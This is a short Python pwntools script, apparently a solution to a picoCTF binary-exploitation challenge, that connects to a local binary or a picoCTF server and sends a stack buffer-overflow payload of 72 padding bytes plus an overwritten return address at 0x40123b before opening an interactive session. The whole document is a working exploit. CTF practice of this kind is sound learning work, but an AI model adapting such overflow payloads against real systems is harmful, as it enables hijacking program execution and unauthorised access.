from pwn import * 

exe = ELF("./vuln")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 52655)

    return r

def main():
	r = conn()
	input()
	payload = b'A'*72 + p64(0x40123b)
	r.sendlineafter(b'flag: \n', payload)
	pause()
	r.interactive()
if __name__ == "__main__":
	main()